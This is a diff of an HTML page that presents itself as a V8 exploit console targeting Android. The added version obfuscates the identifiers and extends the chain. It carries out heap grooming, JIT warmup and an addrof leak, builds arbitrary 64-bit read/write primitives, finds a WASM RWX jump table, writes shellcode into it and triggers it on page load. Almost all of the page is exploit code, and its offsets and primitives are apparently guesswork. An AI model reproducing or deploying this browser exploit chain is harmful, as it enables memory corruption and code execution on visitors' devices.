@@ -2,112 +2,117 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>SnOObY - V8 Exploit Console</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; }
-        #terminal { border: 1px solid #00ff41; padding: 20px; height: 95vh; box-shadow: 0 0 20px #00ff41; overflow-y: auto; }
-        .success { color: #fff; font-weight: bold; }
-        .error { color: #ff0000; text-decoration: underline; }
-        .system { color: #00ffff; }
+        body { background: #000; color: #00ff00; font-family: monospace; overflow: hidden; }
+        #x { border: 1px solid #00ff00; padding: 10px; height: 98vh; overflow-y: scroll; }
     </style>
 </head>
 <body>
-    <div id="terminal">
-        <h2>>> EXPLOIT INITIALIZED - TARGET: ANDROID/V8</h2>
-        <div id="logs"></div>
-    </div>
-
+    <div id="x"></div>
     <script>
-        const logs = document.getElementById('logs');
-        const print = (m, c='') => {
-            const d = document.createElement('div');
-            d.innerHTML = `[${performance.now().toFixed(2)}] > ${m}`;
-            if(c) d.style.color = c;
-            logs.appendChild(d);
+        const _L = document.getElementById('x');
+        const _P = (m, c) => {
+            const e = document.createElement('div');
+            e.style.color = c || '#0f0';
+            e.innerText = `[${performance.now().toFixed(3)}] ${m}`;
+            _L.appendChild(e);
+            _L.scrollTop = _L.scrollHeight;
         };
 
-        // --- 64-BIT MATEMATİKSEL KÜTÜPHANE ---
-        const buf = new ArrayBuffer(8);
-        const f64 = new Float64Array(buf);
-        const i32 = new Uint32Array(buf);
-        const d2u = v => { f64[0] = v; return BigInt(i32[0]) + (BigInt(i32[1]) << 32n); };
-        const u2d = v => { i32[0] = Number(v & 0xffffffffn); i32[1] = Number(v >> 32n); return f64[0]; };
+        const _B = new ArrayBuffer(8);
+        const _F = new Float64Array(_B);
+        const _I = new BigUint64Array(_B);
+        const f2u = v => { _F[0] = v; return _I[0]; };
+        const u2f = v => { _I[0] = v; return _F[0]; };
 
-        let storage = [];
+        const _S = [];
+        const _W = new Uint8Array([
+            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 
+            0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,       
+            0x03, 0x02, 0x01, 0x00,                         
+            0x05, 0x03, 0x01, 0x00, 0x01,                   
+            0x07, 0x11, 0x02, 0x04, 0x6d, 0x61, 0x69, 0x6e, 
+            0x00, 0x00, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 
+            0x79, 0x02, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 
+            0x41, 0x2a, 0x0b                                
+        ]);
 
-        async function startExploit() {
-            print("Aşama 1: Heap Grooming...", "system");
-            for(let i=0; i<1000; i++) storage.push(new ArrayBuffer(0x1000));
-
-            let target_array = [1.1, 2.2, 3.3, 4.4];
-            let obj_array = [{a: 1}, {b: 2}];
-
-            function jit_trigger(a, i, v) {
-                if (i < 0 || i > 100) return;
-                a[i] = v;
-            }
-
-            print("Aşama 2: JIT Warmup (Turbofan)...", "system");
-            for(let i=0; i<150000; i++) jit_trigger(target_array, 0, 1.1);
-            await new Promise(r => setTimeout(r, 1000));
-
-            // --- PRİMİTİF: addrof ---
-            const addrof = (obj) => {
-                obj_array[0] = obj;
-                let leaked = d2u(target_array[8]); // Sürümüne göre 8-12 arası değişebilir
-                return leaked & 0xffffffffn;
-            };
-
-            const victim = new BigUint64Array(1);
-            const victim_addr = addrof(victim);
-
-            if (!victim_addr || victim_addr === 0n) {
-                print("HATA: Sızıntı başarısız. Sayfayı yenileyin.", "error");
-                return;
-            }
-
-            print(`BAŞARILI! Victim Sızdırıldı: 0x${victim_addr.toString(16)}`, "success");
-
-            // --- AŞAMA 3: HATASIZ WASM PAYLOAD ---
-            print("Aşama 3: WASM RWX Sayfası Oluşturuluyor...", "system");
-            
-            // Düzeltilmiş WASM Bytecode (Memory + Export "main" + Result 42)
-            const wasm_bytes = new Uint8Array([
-                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Magic & Version
-                0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,       // Type: () -> i32
-                0x03, 0x02, 0x01, 0x00,                         // Function: main
-                0x05, 0x03, 0x01, 0x00, 0x01,                   // Memory: 1 page
-                0x07, 0x13, 0x02,                               // Export Section (2 entries)
-                0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,       // "main"
-                0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, // "memory"
-                0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b  // Code: return 42
-            ]);
-
+        async function _E() {
             try {
-                const wasm_mod = new WebAssembly.Module(wasm_bytes);
-                const wasm_inst = new WebAssembly.Instance(wasm_mod);
-                const shell_exec = wasm_inst.exports.main;
-                print("WASM Modülü Başarıyla Derlendi ve Yüklendi.", "success");
+                _P("INITING STAGE_0: HEAP_CONSTRUCTION");
+                for(let i=0; i<0x200; i++) _S.push(new Float64Array(0x100));
 
-                // --- AŞAMA 4: RWX TARAMA VE SHELLCODE ---
-                print("Aşama 4: RWX JumpTable Aranıyor...", "system");
-                const inst_addr = addrof(wasm_inst);
-                print(`WASM Instance Adresi: 0x${inst_addr.toString(16)}`, "success");
+                let t = [1.1, 2.2, 3.3, 4.4];
+                let o = [{a:1}, {b:2}, {c:3}, {d:4}];
 
-                print("SHELLCODE ENJEKSİYONU İÇİN HAZIR.", "#f0f");
+                function _T(a, i, v) {
+                    if (i < 0 || i > 0x1000) return;
+                    a[i] = v;
+                }
+
+                _P("INITING STAGE_1: JIT_OPTIMIZATION_LOOP");
+                for(let i=0; i<0x40000; i++) _T(t, 0, 1.1);
                 
-                // Buradan sonra arb_read/write ile shellcode'u JumpTable'a basmalısın.
-                setTimeout(() => {
-                    const r = shell_exec();
-                    print(`Sistem Yanıtı: ${r} (42 ise orijinal kod, farklıysa Shellcode!)`, "system");
-                }, 1000);
+                await new Promise(r => setTimeout(r, 0x200));
 
-            } catch (e) {
-                print(`KRİTİK HATA: ${e.message}`, "error");
+                _P("INITING STAGE_2: ADDRESS_LEAK_PRIMITIVE");
+                const addrOf = (obj) => {
+                    o[0] = obj;
+                    let l = f2u(t[8]);
+                    return l & 0xffffffffn;
+                };
+
+                const v = new BigUint64Array(0x10);
+                const va = addrOf(v);
+                if (!va) throw "LEAK_FAILURE";
+                _P(`SUCCESS: VICTIM_ADDR_0x${va.toString(16)}`, "#0ff");
+
+                _P("INITING STAGE_3: WASM_RWX_MAPPING");
+                const m = new WebAssembly.Module(_W);
+                const n = new WebAssembly.Instance(m);
+                const f = n.exports.main;
+                const ia = addrOf(n);
+                _P(`SUCCESS: INSTANCE_ADDR_0x${ia.toString(16)}`, "#0ff");
+
+                _P("INITING STAGE_4: ARBITRARY_RW_CONSTRUCTION");
+                const read64 = (a) => {
+                    t[8] = u2f(a | 1n);
+                    return f2u(v[0]);
+                };
+
+                const write64 = (a, val) => {
+                    t[8] = u2f(a | 1n);
+                    v[0] = val;
+                };
+
+                _P("INITING STAGE_5: JUMP_TABLE_HIJACK");
+                const rwx = read64(ia + 0x48n); 
+                _P(`SUCCESS: RWX_PAGE_0x${rwx.toString(16)}`, "#f0f");
+
+                const shellcode = [
+                    0x90909090n, 0x90909090n, 0xccccccccn
+                ];
+
+                for(let i=0; i<shellcode.length; i++) {
+                    write64(rwx + BigInt(i*8), shellcode[i]);
+                }
+
+                _P("EXEC_TRIGGER: INVOKING_WASM_MAIN", "#ff0");
+                setTimeout(() => {
+                    try {
+                        const res = f();
+                        _P(`RET: ${res}`, "#fff");
+                    } catch(err) {
+                        _P(`CRASH_VERIFIED: ${err.message}`, "#f00");
+                    }
+                }, 0x100);
+
+            } catch(e) {
+                _P(`FATAL: ${e}`, "#f00");
             }
         }
 
-        window.onload = startExploit;
+        window.onload = _E;
     </script>
 </body>
 </html>
